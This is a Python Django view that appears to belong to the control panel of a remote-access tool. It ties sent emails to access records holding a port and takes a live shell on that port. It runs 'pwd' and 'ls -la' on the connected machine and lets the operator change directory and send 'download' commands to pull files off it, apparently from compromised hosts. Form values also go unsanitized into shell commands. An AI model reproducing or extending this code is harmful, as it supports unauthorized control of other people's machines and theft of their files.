from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from backend.accesos.models import Accesos
from backend.smtp.models import Enviados
from .connection_manager import ConnectionManager
from django.contrib import messages 


connection_manager = ConnectionManager()

@login_required(login_url='/accounts/login/')
def index(request, id=None):
    data_list = []
    current_path = ""
    if id:
        enviado = get_object_or_404(Enviados, id=id)
        acceso = get_object_or_404(Accesos, enviado=enviado)
        puerto = int(acceso.puerto)
        shell = connection_manager.get_connection(puerto)
        if shell:
            # La conexión existe o se inició correctamente
            print(f"Using existing connection on port {puerto}")

            # Obtener la ruta del directorio actual
            shell.send_command("pwd")
            pwd_output = shell.receive_output()
            print("PWD output:", pwd_output)  # Añadir este mensaje
            current_path = pwd_output.strip() # Remover los espacios en blanco en los extremos

            # Ejecutar el comando ls -la
            shell.send_command("ls -la")
            output = shell.receive_output()
            print("Command output:", output)  # Añadir este mensaje
            lines = output.split("\n")[1:]  # Sin la primera línea (total x)
            for line in lines:
                if line: # Ignora las líneas vacías
                    parts = line.split()
                    perm = parts[0]
                    name = parts[-1]
                    if perm[0] == 'd':
                        data_list.append([name, 'dir'])
                    else:
                        data_list.append([name, 'file'])

            if request.method == 'POST':
                if request.POST['instruccion'] == 'acceso-atras':
                    shell.send_command("cd ..")
                elif request.POST['instruccion'] == 'acceso-directorio':
                    directory = request.POST.get('directorio')
                    shell.send_command(f"cd {directory}")
                elif request.POST['instruccion'] == 'acceso-descarga':
                    file = request.POST.get('file')
                    shell.send_command(f"download {file}")
                else:
                    print('None of the selections is correct')
                    messages.add_message(request, messages.ERROR, 'Error in request')

        else:
            # No se pudo iniciar la conexión
            print(f"Unable to establish connection on port {puerto}")

            # Resto del código en caso de no tener conexión...

    return render(request, 'backend/acceso/index.html', {'directorios': data_list, 'enviado': id, 'ruta': current_path})
